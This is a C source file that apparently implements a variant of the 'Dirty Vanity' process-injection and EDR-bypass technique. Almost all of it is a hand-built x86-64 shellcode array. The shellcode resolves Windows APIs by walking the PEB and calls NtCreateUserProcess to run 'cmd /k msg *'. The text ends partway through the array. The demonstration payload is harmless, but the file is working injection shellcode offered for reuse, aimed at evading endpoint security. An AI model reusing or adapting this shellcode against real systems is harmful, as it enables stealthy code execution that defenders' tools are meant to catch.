#include "vanity.h"
#include <stdint.h>
// Variant of Dirty Vanity technique founed by Eliran Nissan in "Dirty Vanity: A New Approach to Code injection & EDR bypass"
/*
 * Original Author: Eliran Nissan
 * Modified by: Tam Meng
 * Date: May 4, 2023
 */
/* I am learning from the experts */
// Compiled with x86_64-w64-mingw32-gcc vanity.c -o vanity.exe
// creates a cmd /k msg * Hello from Tam.Meng
// and suspends the injection
unsigned char spellcode[] =
       {
         0x40,0x55,0x57,0x48,0x81,0xec,0xb8,0x03,0x00,0x00,
         0x48,0x8d,0x6c,0x24,0x60,0x65,0x48,0x8b,0x04,0x25,
         0x60,0x00,0x00,0x00,0x48,0x89,0x45,0x00,0x48,0x8b,
         0x45,0x00,0x48,0x8b,0x40,0x18,0x48,0x89,0x45,0x08,
         0x48,0x8b,0x45,0x08,0xc6,0x40,0x48,0x00,0x48,0x8b,
         0x45,0x00,0x48,0x8b,0x40,0x18,0x48,0x83,0xc0,0x20,
         0x48,0x89,0x85,0x30,0x01,0x00,0x00,0x48,0x8b,0x85,
         0x30,0x01,0x00,0x00,0x48,0x8b,0x00,0x48,0x89,0x85,
         0x38,0x01,0x00,0x00,0x48,0xb8,0x6b,0x00,0x65,0x00,
         0x72,0x00,0x6e,0x00,0x48,0x89,0x45,0x38,0x48,0xb8,
         0x65,0x00,0x6c,0x00,0x33,0x00,0x32,0x00,0x48,0x89,
         0x45,0x40,0x48,0xb8,0x2e,0x00,0x64,0x00,0x6c,0x00,
         0x6c,0x00,0x48,0x89,0x45,0x48,0x48,0xc7,0x45,0x50,
         0x00,0x00,0x00,0x00,0x48,0xc7,0x85,0x50,0x01,0x00,
         0x00,0x00,0x00,0x00,0x00,0x48,0x8b,0x85,0x30,0x01,
         0x00,0x00,0x48,0x8b,0x00,0x48,0x89,0x85,0x38,0x01,
         0x00,0x00,0x48,0x8b,0x85,0x38,0x01,0x00,0x00,0x48,
         0x83,0xe8,0x10,0x48,0x89,0x85,0x58,0x01,0x00,0x00,
         0xc7,0x85,0x60,0x01,0x00,0x00,0x00,0x00,0x00,0x00,
         0x48,0x8b,0x85,0x58,0x01,0x00,0x00,0x48,0x8b,0x40,
         0x60,0x48,0x89,0x85,0x48,0x01,0x00,0x00,0x48,0x8d,
         0x45,0x38,0x48,0x89,0x85,0x40,0x01,0x00,0x00,0xc7,
         0x85,0x60,0x01,0x00,0x00,0x01,0x00,0x00,0x00,0x48,
         0x8b,0x85,0x48,0x01,0x00,0x00,0x0f,0xb7,0x00,0x85,
         0xc0,0x75,0x0f,0xc7,0x85,0x60,0x01,0x00,0x00,0x00,
         0x00,0x00,0x00,0xe9,0x2e,0x01,0x00,0x00,0x48,0x8b,
         0x85,0x48,0x01,0x00,0x00,0x0f,0xb6,0x00,0x88,0x85,
         0x64,0x01,0x00,0x00,0x48,0x8b,0x85,0x48,0x01,0x00,
         0x00,0x0f,0xb7,0x00,0x3d,0xff,0x00,0x00,0x00,0x7e,
         0x13,0x48,0x8b,0x85,0x48,0x01,0x00,0x00,0x0f,0xb7,
         0x00,0x66,0x89,0x85,0x68,0x01,0x00,0x00,0xeb,0x46,
         0x0f,0xbe,0x85,0x64,0x01,0x00,0x00,0x83,0xf8,0x41,
         0x7c,0x1e,0x0f,0xbe,0x85,0x64,0x01,0x00,0x00,0x83,
         0xf8,0x5a,0x7f,0x12,0x0f,0xbe,0x85,0x64,0x01,0x00,
         0x00,0x83,0xc0,0x20,0x88,0x85,0x65,0x01,0x00,0x00,
         0xeb,0x0d,0x0f,0xb6,0x85,0x64,0x01,0x00,0x00,0x88,
         0x85,0x65,0x01,0x00,0x00,0x66,0x0f,0xbe,0x85,0x65,
         0x01,0x00,0x00,0x66,0x89,0x85,0x68,0x01,0x00,0x00,
         0x48,0x8b,0x85,0x40,0x01,0x00,0x00,0x0f,0xb6,0x00,
         0x88,0x85,0x64,0x01,0x00,0x00,0x48,0x8b,0x85,0x40,
         0x01,0x00,0x00,0x0f,0xb7,0x00,0x3d,0xff,0x00,0x00,
         0x00,0x7e,0x13,0x48,0x8b,0x85,0x40,0x01,0x00,0x00,
         0x0f,0xb7,0x00,0x66,0x89,0x85,0x6c,0x01,0x00,0x00,
         0xeb,0x46,0x0f,0xbe,0x85,0x64,0x01,0x00,0x00,0x83,
         0xf8,0x41,0x7c,0x1e,0x0f,0xbe,0x85,0x64,0x01,0x00,
         0x00,0x83,0xf8,0x5a,0x7f,0x12,0x0f,0xbe,0x85,0x64,
         0x01,0x00,0x00,0x83,0xc0,0x20,0x88,0x85,0x65,0x01,
         0x00,0x00,0xeb,0x0d,0x0f,0xb6,0x85,0x64,0x01,0x00,
         0x00,0x88,0x85,0x65,0x01,0x00,0x00,0x66,0x0f,0xbe,
         0x85,0x65,0x01,0x00,0x00,0x66,0x89,0x85,0x6c,0x01,
         0x00,0x00,0x48,0x8b,0x85,0x48,0x01,0x00,0x00,0x48,
         0x83,0xc0,0x02,0x48,0x89,0x85,0x48,0x01,0x00,0x00,
         0x48,0x8b,0x85,0x40,0x01,0x00,0x00,0x48,0x83,0xc0,
         0x02,0x48,0x89,0x85,0x40,0x01,0x00,0x00,0x0f,0xb7,
         0x85,0x68,0x01,0x00,0x00,0x0f,0xb7,0x8d,0x6c,0x01,
         0x00,0x00,0x3b,0xc1,0x0f,0x84,0xb5,0xfe,0xff,0xff,
         0x83,0xbd,0x60,0x01,0x00,0x00,0x00,0x0f,0x84,0x2e,
         0x01,0x00,0x00,0x48,0x8b,0x85,0x48,0x01,0x00,0x00,
         0x48,0x83,0xe8,0x02,0x48,0x89,0x85,0x48,0x01,0x00,
         0x00,0x48,0x8b,0x85,0x40,0x01,0x00,0x00,0x48,0x83,
         0xe8,0x02,0x48,0x89,0x85,0x40,0x01,0x00,0x00,0x48,
         0x8b,0x85,0x48,0x01,0x00,0x00,0x0f,0xb6,0x00,0x88,
         0x85,0x64,0x01,0x00,0x00,0x48,0x8b,0x85,0x48,0x01,
         0x00,0x00,0x0f,0xb7,0x00,0x3d,0xff,0x00,0x00,0x00,
         0x7e,0x13,0x48,0x8b,0x85,0x48,0x01,0x00,0x00,0x0f,
         0xb7,0x00,0x66,0x89,0x85,0x68,0x01,0x00,0x00,0xeb,
         0x46,0x0f,0xbe,0x85,0x64,0x01,0x00,0x00,0x83,0xf8,
         0x41,0x7c,0x1e,0x0f,0xbe,0x85,0x64,0x01,0x00,0x00,
         0x83,0xf8,0x5a,0x7f,0x12,0x0f,0xbe,0x85,0x64,0x01,
         0x00,0x00,0x83,0xc0,0x20,0x88,0x85,0x65,0x01,0x00,
         0x00,0xeb,0x0d,0x0f,0xb6,0x85,0x64,0x01,0x00,0x00,
         0x88,0x85,0x65,0x01,0x00,0x00,0x66,0x0f,0xbe,0x85,
         0x65,0x01,0x00,0x00,0x66,0x89,0x85,0x68,0x01,0x00,
         0x00,0x48,0x8b,0x85,0x40,0x01,0x00,0x00,0x0f,0xb6,
         0x00,0x88,0x85,0x64,0x01,0x00,0x00,0x48,0x8b,0x85,
         0x40,0x01,0x00,0x00,0x0f,0xb7,0x00,0x3d,0xff,0x00,
         0x00,0x00,0x7e,0x13,0x48,0x8b,0x85,0x40,0x01,0x00,
         0x00,0x0f,0xb7,0x00,0x66,0x89,0x85,0x6c,0x01,0x00,
         0x00,0xeb,0x46,0x0f,0xbe,0x85,0x64,0x01,0x00,0x00,
         0x83,0xf8,0x41,0x7c,0x1e,0x0f,0xbe,0x85,0x64,0x01,
         0x00,0x00,0x83,0xf8,0x5a,0x7f,0x12,0x0f,0xbe,0x85,
         0x64,0x01,0x00,0x00,0x83,0xc0,0x20,0x88,0x85,0x65,
         0x01,0x00,0x00,0xeb,0x0d,0x0f,0xb6,0x85,0x64,0x01,
         0x00,0x00,0x88,0x85,0x65,0x01,0x00,0x00,0x66,0x0f,
         0xbe,0x85,0x65,0x01,0x00,0x00,0x66,0x89,0x85,0x6c,
         0x01,0x00,0x00,0x0f,0xb7,0x85,0x68,0x01,0x00,0x00,
         0x0f,0xb7,0x8d,0x6c,0x01,0x00,0x00,0x2b,0xc1,0x89,
         0x85,0x60,0x01,0x00,0x00,0x83,0xbd,0x60,0x01,0x00,
         0x00,0x00,0x75,0x10,0x48,0x8b,0x85,0x58,0x01,0x00,
         0x00,0x48,0x89,0x85,0x50,0x01,0x00,0x00,0xeb,0x25,
         0x48,0x8b,0x85,0x38,0x01,0x00,0x00,0x48,0x8b,0x00,
         0x48,0x89,0x85,0x38,0x01,0x00,0x00,0x48,0x8b,0x85,
         0x30,0x01,0x00,0x00,0x48,0x39,0x85,0x38,0x01,0x00,
         0x00,0x0f,0x85,0xf9,0xfc,0xff,0xff,0x48,0x8b,0x85,
         0x50,0x01,0x00,0x00,0x48,0x89,0x85,0x70,0x01,0x00,
         0x00,0x48,0xb8,0x6e,0x00,0x74,0x00,0x64,0x00,0x6c,
         0x00,0x48,0x89,0x45,0x38,0x48,0xb8,0x6c,0x00,0x2e,
         0x00,0x64,0x00,0x6c,0x00,0x48,0x89,0x45,0x40,0x48,
         0xc7,0x45,0x48,0x6c,0x00,0x00,0x00,0x48,0xc7,0x45,
         0x50,0x00,0x00,0x00,0x00,0x48,0xc7,0x85,0x78,0x01,
         0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8b,0x85,0x30,
         0x01,0x00,0x00,0x48,0x8b,0x00,0x48,0x89,0x85,0x38,
         0x01,0x00,0x00,0x48,0x8b,0x85,0x38,0x01,0x00,0x00,
         0x48,0x83,0xe8,0x10,0x48,0x89,0x85,0x80,0x01,0x00,
         0x00,0xc7,0x85,0x88,0x01,0x00,0x00,0x00,0x00,0x00,
         0x00,0x48,0x8b,0x85,0x80,0x01,0x00,0x00,0x48,0x8b,
         0x40,0x60,0x48,0x89,0x85,0x48,0x01,0x00,0x00,0x48,
         0x8d,0x45,0x38,0x48,0x89,0x85,0x40,0x01,0x00,0x00,
         0xc7,0x85,0x88,0x01,0x00,0x00,0x01,0x00,0x00,0x00,
         0x48,0x8b,0x85,0x48,0x01,0x00,0x00,0x0f,0xb7,0x00,
         0x85,0xc0,0x75,0x0f,0xc7,0x85,0x88,0x01,0x00,0x00,
         0x00,0x00,0x00,0x00,0xe9,0x2e,0x01,0x00,0x00,0x48,
         0x8b,0x85,0x48,0x01,0x00,0x00,0x0f,0xb6,0x00,0x88,
         0x85,0x8c,0x01,0x00,0x00,0x48,0x8b,0x85,0x48,0x01,
         0x00,0x00,0x0f,0xb7,0x00,0x3d,0xff,0x00,0x00,0x00,
         0x7e,0x13,0x48,0x8b,0x85,0x48,0x01,0x00,0x00,0x0f,
         0xb7,0x00,0x66,0x89,0x85,0x90,0x01,0x00,0x00,0xeb,
         0x46,0x0f,0xbe,0x85,0x8c,0x01,0x00,0x00,0x83,0xf8,
         0x41,0x7c,0x1e,0x0f,0xbe,0x85,0x8c,0x01,0x00,0x00,
         0x83,0xf8,0x5a,0x7f,0x12,0x0f,0xbe,0x85,0x8c,0x01,
         0x00,0x00,0x83,0xc0,0x20,0x88,0x85,0x8d,0x01,0x00,
         0x00,0xeb,0x0d,0x0f,0xb6,0x85,0x8c,0x01,0x00,0x00,
         0x88,0x85,0x8d,0x01,0x00,0x00,0x66,0x0f,0xbe,0x85,
         0x8d,0x01,0x00,0x00,0x66,0x89,0x85,0x90,0x01,0x00,
         0x00,0x48,0x8b,0x85,0x40,0x01,0x00,0x00,0x0f,0xb6,
         0x00,0x88,0x85,0x8c,0x01,0x00,0x00,0x48,0x8b,0x85,
         0x40,0x01,0x00,0x00,0x0f,0xb7,0x00,0x3d,0xff,0x00,
         0x00,0x00,0x7e,0x13,0x48,0x8b,0x85,0x40,0x01,0x00,
         0x00,0x0f,0xb7,0x00,0x66,0x89,0x85,0x94,0x01,0x00,
         0x00,0xeb,0x46,0x0f,0xbe,0x85,0x8c,0x01,0x00,0x00,
         0x83,0xf8,0x41,0x7c,0x1e,0x0f,0xbe,0x85,0x8c,0x01,
         0x00,0x00,0x83,0xf8,0x5a,0x7f,0x12,0x0f,0xbe,0x85,
         0x8c,0x01,0x00,0x00,0x83,0xc0,0x20,0x88,0x85,0x8d,
         0x01,0x00,0x00,0xeb,0x0d,0x0f,0xb6,0x85,0x8c,0x01,
         0x00,0x00,0x88,0x85,0x8d,0x01,0x00,0x00,0x66,0x0f,
         0xbe,0x85,0x8d,0x01,0x00,0x00,0x66,0x89,0x85,0x94,
         0x01,0x00,0x00,0x48,0x8b,0x85,0x48,0x01,0x00,0x00,
         0x48,0x83,0xc0,0x02,0x48,0x89,0x85,0x48,0x01,0x00,
         0x00,0x48,0x8b,0x85,0x40,0x01,0x00,0x00,0x48,0x83,
         0xc0,0x02,0x48,0x89,0x85,0x40,0x01,0x00,0x00,0x0f,
         0xb7,0x85,0x90,0x01,0x00,0x00,0x0f,0xb7,0x8d,0x94,
         0x01,0x00,0x00,0x3b,0xc1,0x0f,0x84,0xb5,0xfe,0xff,
         0xff,0x83,0xbd,0x88,0x01,0x00,0x00,0x00,0x0f,0x84,
         0x2e,0x01,0x00,0x00,0x48,0x8b,0x85,0x48,0x01,0x00,
         0x00,0x48,0x83,0xe8,0x02,0x48,0x89,0x85,0x48,0x01,
         0x00,0x00,0x48,0x8b,0x85,0x40,0x01,0x00,0x00,0x48,
         0x83,0xe8,0x02,0x48,0x89,0x85,0x40,0x01,0x00,0x00,
         0x48,0x8b,0x85,0x48,0x01,0x00,0x00,0x0f,0xb6,0x00,
         0x88,0x85,0x8c,0x01,0x00,0x00,0x48,0x8b,0x85,0x48,
         0x01,0x00,0x00,0x0f,0xb7,0x00,0x3d,0xff,0x00,0x00,
         0x00,0x7e,0x13,0x48,0x8b,0x85,0x48,0x01,0x00,0x00,
         0x0f,0xb7,0x00,0x66,0x89,0x85,0x90,0x01,0x00,0x00,
         0xeb,0x46,0x0f,0xbe,0x85,0x8c,0x01,0x00,0x00,0x83,
         0xf8,0x41,0x7c,0x1e,0x0f,0xbe,0x85,0x8c,0x01,0x00,
         0x00,0x83,0xf8,0x5a,0x7f,0x12,0x0f,0xbe,0x85,0x8c,
         0x01,0x00,0x00,0x83,0xc0,0x20,0x88,0x85,0x8d,0x01,
         0x00,0x00,0xeb,0x0d,0x0f,0xb6,0x85,0x8c,0x01,0x00,
         0x00,0x88,0x85,0x8d,0x01,0x00,0x00,0x66,0x0f,0xbe,
         0x85,0x8d,0x01,0x00,0x00,0x66,0x89,0x85,0x90,0x01,
         0x00,0x00,0x48,0x8b,0x85,0x40,0x01,0x00,0x00,0x0f,
         0xb6,0x00,0x88,0x85,0x8c,0x01,0x00,0x00,0x48,0x8b,
         0x85,0x40,0x01,0x00,0x00,0x0f,0xb7,0x00,0x3d,0xff,
         0x00,0x00,0x00,0x7e,0x13,0x48,0x8b,0x85,0x40,0x01,
         0x00,0x00,0x0f,0xb7,0x00,0x66,0x89,0x85,0x94,0x01,
         0x00,0x00,0xeb,0x46,0x0f,0xbe,0x85,0x8c,0x01,0x00,
         0x00,0x83,0xf8,0x41,0x7c,0x1e,0x0f,0xbe,0x85,0x8c,
         0x01,0x00,0x00,0x83,0xf8,0x5a,0x7f,0x12,0x0f,0xbe,
         0x85,0x8c,0x01,0x00,0x00,0x83,0xc0,0x20,0x88,0x85,
         0x8d,0x01,0x00,0x00,0xeb,0x0d,0x0f,0xb6,0x85,0x8c,
         0x01,0x00,0x00,0x88,0x85,0x8d,0x01,0x00,0x00,0x66,
         0x0f,0xbe,0x85,0x8d,0x01,0x00,0x00,0x66,0x89,0x85,
         0x94,0x01,0x00,0x00,0x0f,0xb7,0x85,0x90,0x01,0x00,
         0x00,0x0f,0xb7,0x8d,0x94,0x01,0x00,0x00,0x2b,0xc1,
         0x89,0x85,0x88,0x01,0x00,0x00,0x83,0xbd,0x88,0x01,
         0x00,0x00,0x00,0x75,0x10,0x48,0x8b,0x85,0x80,0x01,
         0x00,0x00,0x48,0x89,0x85,0x78,0x01,0x00,0x00,0xeb,
         0x25,0x48,0x8b,0x85,0x38,0x01,0x00,0x00,0x48,0x8b,
         0x00,0x48,0x89,0x85,0x38,0x01,0x00,0x00,0x48,0x8b,
         0x85,0x30,0x01,0x00,0x00,0x48,0x39,0x85,0x38,0x01,
         0x00,0x00,0x0f,0x85,0xf9,0xfc,0xff,0xff,0x48,0x8b,
         0x85,0x50,0x01,0x00,0x00,0x48,0x8b,0x40,0x30,0x48,
         0x89,0x85,0x98,0x01,0x00,0x00,0x48,0x8b,0x85,0x98,
         0x01,0x00,0x00,0x48,0x63,0x40,0x3c,0x48,0x8b,0x8d,
         0x98,0x01,0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,
         0x48,0x89,0x85,0xa0,0x01,0x00,0x00,0xb8,0x08,0x00,
         0x00,0x00,0x48,0x6b,0xc0,0x00,0x48,0x8b,0x8d,0xa0,
         0x01,0x00,0x00,0x8b,0x84,0x01,0x88,0x00,0x00,0x00,
         0x48,0x8b,0x8d,0x98,0x01,0x00,0x00,0x48,0x03,0xc8,
         0x48,0x8b,0xc1,0x48,0x89,0x85,0xa8,0x01,0x00,0x00,
         0x48,0x8b,0x85,0xa8,0x01,0x00,0x00,0x8b,0x40,0x20,
         0x48,0x8b,0x8d,0x98,0x01,0x00,0x00,0x48,0x03,0xc8,
         0x48,0x8b,0xc1,0x48,0x89,0x85,0xb0,0x01,0x00,0x00,
         0x48,0xb8,0x47,0x65,0x74,0x50,0x72,0x6f,0x63,0x41,
         0x48,0x89,0x45,0x10,0xc7,0x85,0xb8,0x01,0x00,0x00,
         0x00,0x00,0x00,0x00,0x48,0x63,0x85,0xb8,0x01,0x00,
         0x00,0x48,0x8b,0x8d,0xb0,0x01,0x00,0x00,0x48,0x63,
         0x04,0x81,0x48,0x8b,0x8d,0x98,0x01,0x00,0x00,0x48,
         0x8b,0x55,0x10,0x48,0x39,0x14,0x01,0x74,0x10,0x8b,
         0x85,0xb8,0x01,0x00,0x00,0xff,0xc0,0x89,0x85,0xb8,
         0x01,0x00,0x00,0xeb,0xcd,0x48,0x8b,0x85,0xa8,0x01,
         0x00,0x00,0x8b,0x40,0x24,0x48,0x8b,0x8d,0x98,0x01,
         0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x48,0x89,
         0x85,0xc0,0x01,0x00,0x00,0x48,0x8b,0x85,0xa8,0x01,
         0x00,0x00,0x8b,0x40,0x1c,0x48,0x8b,0x8d,0x98,0x01,
         0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x48,0x89,
         0x85,0xc8,0x01,0x00,0x00,0x48,0x63,0x85,0xb8,0x01,
         0x00,0x00,0x48,0x8b,0x8d,0xc0,0x01,0x00,0x00,0x48,
         0x0f,0xbf,0x04,0x41,0x48,0x8b,0x8d,0xc8,0x01,0x00,
         0x00,0x48,0x63,0x04,0x81,0x48,0x8b,0x8d,0x98,0x01,
         0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x48,0x89,
         0x85,0xd0,0x01,0x00,0x00,0x48,0x8b,0x85,0x98,0x01,
         0x00,0x00,0x48,0x89,0x85,0xd8,0x01,0x00,0x00,0x48,
         0x8b,0x85,0x78,0x01,0x00,0x00,0x48,0x89,0x85,0xe0,
         0x01,0x00,0x00,0x48,0x8b,0x85,0xe0,0x01,0x00,0x00,
         0xc7,0x80,0x14,0x01,0x00,0x00,0xff,0xff,0xff,0xff,
         0x48,0x8b,0x85,0x78,0x01,0x00,0x00,0x48,0x8b,0x40,
         0x30,0x48,0x89,0x85,0xe8,0x01,0x00,0x00,0x48,0xb8,
         0x4c,0x6f,0x61,0x64,0x4c,0x69,0x62,0x72,0x48,0x89,
         0x45,0x10,0x48,0xc7,0x45,0x18,0x61,0x72,0x79,0x41,
         0x48,0x8d,0x55,0x10,0x48,0x8b,0x8d,0xd8,0x01,0x00,
         0x00,0xff,0x95,0xd0,0x01,0x00,0x00,0x48,0x89,0x85,
         0xf0,0x01,0x00,0x00,0x48,0xb8,0x52,0x74,0x6c,0x41,
         0x6c,0x6c,0x6f,0x63,0x48,0x89,0x45,0x10,0x48,0xb8,
         0x61,0x74,0x65,0x48,0x65,0x61,0x70,0x00,0x48,0x89,
         0x45,0x18,0x48,0x8d,0x55,0x10,0x48,0x8b,0x8d,0xe8,
         0x01,0x00,0x00,0xff,0x95,0xd0,0x01,0x00,0x00,0x48,
         0x89,0x85,0xf8,0x01,0x00,0x00,0x48,0xb8,0x52,0x74,
         0x6c,0x43,0x72,0x65,0x61,0x74,0x48,0x89,0x45,0x38,
         0x48,0xb8,0x65,0x50,0x72,0x6f,0x63,0x65,0x73,0x73,
         0x48,0x89,0x45,0x40,0x48,0xb8,0x50,0x61,0x72,0x61,
         0x6d,0x65,0x74,0x65,0x48,0x89,0x45,0x48,0x48,0xc7,
         0x45,0x50,0x72,0x73,0x45,0x78,0x48,0x8d,0x55,0x38,
         0x48,0x8b,0x8d,0xe8,0x01,0x00,0x00,0xff,0x95,0xd0,
         0x01,0x00,0x00,0x48,0x89,0x85,0x00,0x02,0x00,0x00,
         0x48,0xb8,0x4e,0x74,0x43,0x72,0x65,0x61,0x74,0x65,
         0x48,0x89,0x45,0x20,0x48,0xb8,0x55,0x73,0x65,0x72,
         0x50,0x72,0x6f,0x63,0x48,0x89,0x45,0x28,0x48,0xc7,
         0x45,0x30,0x65,0x73,0x73,0x00,0x48,0x8d,0x55,0x20,
         0x48,0x8b,0x8d,0xe8,0x01,0x00,0x00,0xff,0x95,0xd0,
         0x01,0x00,0x00,0x48,0x89,0x85,0x08,0x02,0x00,0x00,
         0x48,0xb8,0x52,0x74,0x6c,0x49,0x6e,0x69,0x74,0x55,
         0x48,0x89,0x45,0x20,0x48,0xb8,0x6e,0x69,0x63,0x6f,
         0x64,0x65,0x53,0x74,0x48,0x89,0x45,0x28,0x48,0xc7,
         0x45,0x30,0x72,0x69,0x6e,0x67,0x48,0x8d,0x55,0x20,
         0x48,0x8b,0x8d,0xe8,0x01,0x00,0x00,0xff,0x95,0xd0,
         0x01,0x00,0x00,0x48,0x89,0x85,0x10,0x02,0x00,0x00,
         0x48,0xb8,0x5c,0x00,0x3f,0x00,0x3f,0x00,0x5c,0x00,
         0x48,0x89,0x45,0x60,0x48,0xb8,0x43,0x00,0x3a,0x00,
         0x5c,0x00,0x57,0x00,0x48,0x89,0x45,0x68,0x48,0xb8,
         0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,0x48,0x89,
         0x45,0x70,0x48,0xb8,0x77,0x00,0x73,0x00,0x5c,0x00,
         0x53,0x00,0x48,0x89,0x45,0x78,0x48,0xb8,0x79,0x00,
         0x73,0x00,0x74,0x00,0x65,0x00,0x48,0x89,0x85,0x80,
         0x00,0x00,0x00,0x48,0xb8,0x6d,0x00,0x33,0x00,0x32,
         0x00,0x5c,0x00,0x48,0x89,0x85,0x88,0x00,0x00,0x00,
         0x48,0xb8,0x63,0x00,0x6d,0x00,0x64,0x00,0x2e,0x00,
         0x48,0x89,0x85,0x90,0x00,0x00,0x00,0x48,0xb8,0x65,
         0x00,0x78,0x00,0x65,0x00,0x00,0x00,0x48,0x89,0x85,
         0x98,0x00,0x00,0x00,0x48,0x8d,0x55,0x60,0x48,0x8d,
         0x8d,0x18,0x02,0x00,0x00,0xff,0x95,0x10,0x02,0x00,
         0x00,0x48,0xb8,0x5c,0x00,0x3f,0x00,0x3f,0x00,0x5c,
         0x00,0x48,0x89,0x85,0xa0,0x00,0x00,0x00,0x48,0xb8,
         0x43,0x00,0x3a,0x00,0x5c,0x00,0x57,0x00,0x48,0x89,
         0x85,0xa8,0x00,0x00,0x00,0x48,0xb8,0x69,0x00,0x6e,
         0x00,0x64,0x00,0x6f,0x00,0x48,0x89,0x85,0xb0,0x00,
         0x00,0x00,0x48,0xb8,0x77,0x00,0x73,0x00,0x5c,0x00,
         0x53,0x00,0x48,0x89,0x85,0xb8,0x00,0x00,0x00,0x48,
         0xb8,0x79,0x00,0x73,0x00,0x74,0x00,0x65,0x00,0x48,
         0x89,0x85,0xc0,0x00,0x00,0x00,0x48,0xb8,0x6d,0x00,
         0x33,0x00,0x32,0x00,0x5c,0x00,0x48,0x89,0x85,0xc8,
         0x00,0x00,0x00,0x48,0xb8,0x63,0x00,0x6d,0x00,0x64,
         0x00,0x2e,0x00,0x48,0x89,0x85,0xd0,0x00,0x00,0x00,
         0x48,0xb8,0x65,0x00,0x78,0x00,0x65,0x00,0x20,0x00,
         0x48,0x89,0x85,0xd8,0x00,0x00,0x00,0x48,0xb8,0x2f,
         0x00,0x6b,0x00,0x20,0x00,0x6d,0x00,0x48,0x89,0x85,
         0xe0,0x00,0x00,0x00,0x48,0xb8,0x73,0x00,0x67,0x00,
         0x20,0x00,0x2a,0x00,0x48,0x89,0x85,0xe8,0x00,0x00,
         0x00,0x48,0xb8,0x20,0x00,0x48,0x00,0x65,0x00,0x6c,
         0x00,0x48,0x89,0x85,0xf0,0x00,0x00,0x00,0x48,0xb8,
         0x6c,0x00,0x6f,0x00,0x20,0x00,0x66,0x00,0x48,0x89,
         0x85,0xf8,0x00,0x00,0x00,0x48,0xb8,0x72,0x00,0x6f,
         0x00,0x6d,0x00,0x20,0x00,0x48,0x89,0x85,0x00,0x01,
         0x00,0x00,0x48,0xb8,0x54,0x00,0x61,0x00,0x6d,0x00,
         0x2e,0x00,0x48,0x89,0x85,0x08,0x01,0x00,0x00,0x48,
         0xb8,0x4d,0x00,0x65,0x00,0x6e,0x00,0x67,0x00,0x48,
         0x89,0x85,0x10,0x01,0x00,0x00,0x48,0xb8,0x20,0x00,
         0x45,0x00,0x4e,0x00,0x55,0x00,0x48,0x89,0x85,0x18,
         0x01,0x00,0x00,0x48,0xc7,0x85,0x20,0x01,0x00,0x00,
         0x3a,0x00,0x29,0x00,0x48,0x8d,0x95,0xa0,0x00,0x00,
         0x00,0x48,0x8d,0x8d,0x28,0x02,0x00,0x00,0xff,0x95,
         0x10,0x02,0x00,0x00,0x48,0xc7,0x85,0x38,0x02,0x00,
         0x00,0x00,0x00,0x00,0x00,0xc7,0x44,0x24,0x50,0x01,
         0x00,0x00,0x00,0x48,0xc7,0x44,0x24,0x48,0x00,0x00,
         0x00,0x00,0x48,0xc7,0x44,0x24,0x40,0x00,0x00,0x00,
         0x00,0x48,0xc7,0x44,0x24,0x38,0x00,0x00,0x00,0x00,
         0x48,0xc7,0x44,0x24,0x30,0x00,0x00,0x00,0x00,0x48,
         0xc7,0x44,0x24,0x28,0x00,0x00,0x00,0x00,0x48,0x8d,
         0x85,0x28,0x02,0x00,0x00,0x48,0x89,0x44,0x24,0x20,
         0x45,0x33,0xc9,0x45,0x33,0xc0,0x48,0x8d,0x95,0x18,
         0x02,0x00,0x00,0x48,0x8d,0x8d,0x38,0x02,0x00,0x00,
         0xff,0x95,0x00,0x02,0x00,0x00,0x48,0x8d,0x85,0x40,
         0x02,0x00,0x00,0x48,0x8b,0xf8,0x33,0xc0,0xb9,0x58,
         0x00,0x00,0x00,0xf3,0xaa,0x48,0xc7,0x85,0x40,0x02,
         0x00,0x00,0x58,0x00,0x00,0x00,0xc7,0x85,0x48,0x02,
         0x00,0x00,0x00,0x00,0x00,0x00,0xb8,0x08,0x00,0x00,
         0x00,0x48,0x6b,0xc0,0x01,0x41,0xb8,0x20,0x00,0x00,
         0x00,0xba,0x08,0x00,0x00,0x00,0x48,0x8b,0x4d,0x00,
         0x48,0x8b,0x4c,0x01,0x28,0xff,0x95,0xf8,0x01,0x00,
         0x00,0x48,0x89,0x85,0xa0,0x02,0x00,0x00,0x48,0x8b,
         0x85,0xa0,0x02,0x00,0x00,0x48,0xc7,0x00,0x28,0x00,
         0x00,0x00,0xb8,0x20,0x00,0x00,0x00,0x48,0x6b,0xc0,
         0x00,0x48,0x8b,0x8d,0xa0,0x02,0x00,0x00,0xc7,0x44,
         0x01,0x08,0x05,0x00,0x02,0x00,0xb8,0x20,0x00,0x00,
         0x00,0x48,0x6b,0xc0,0x00,0x0f,0xb7,0x8d,0x18,0x02,
         0x00,0x00,0x48,0x8b,0x95,0xa0,0x02,0x00,0x00,0x48,
         0x89,0x4c,0x02,0x10,0xb8,0x20,0x00,0x00,0x00,0x48,
         0x6b,0xc0,0x00,0x48,0x8b,0x8d,0xa0,0x02,0x00,0x00,
         0x48,0x8b,0x95,0x20,0x02,0x00,0x00,0x48,0x89,0x54,
         0x01,0x18,0x48,0xc7,0x85,0xb0,0x02,0x00,0x00,0x00,
         0x00,0x00,0x00,0x48,0x8b,0x85,0xa0,0x02,0x00,0x00,
         0x48,0x89,0x44,0x24,0x50,0x48,0x8d,0x85,0x40,0x02,
         0x00,0x00,0x48,0x89,0x44,0x24,0x48,0x48,0x8b,0x85,
         0x38,0x02,0x00,0x00,0x48,0x89,0x44,0x24,0x40,0xc7,
         0x44,0x24,0x38,0x00,0x00,0x00,0x00,0xc7,0x44,0x24,
         0x30,0x00,0x00,0x00,0x00,0x48,0xc7,0x44,0x24,0x28,
         0x00,0x00,0x00,0x00,0x48,0xc7,0x44,0x24,0x20,0x00,
         0x00,0x00,0x00,0x41,0xb9,0xff,0xff,0x1f,0x00,0x41,
         0xb8,0xff,0xff,0x1f,0x00,0x48,0x8d,0x95,0xb0,0x02,
         0x00,0x00,0x48,0x8d,0x8d,0xa8,0x02,0x00,0x00,0xff,
         0x95,0x08,0x02,0x00,0x00,0x89,0x85,0xb8,0x02,0x00,
         0x00,0x48,0xb8,0x4e,0x74,0x53,0x75,0x73,0x70,0x65,
         0x6e,0x48,0x89,0x45,0x10,0x48,0xb8,0x64,0x54,0x68,
         0x72,0x65,0x61,0x64,0x00,0x48,0x89,0x45,0x18,0x48,
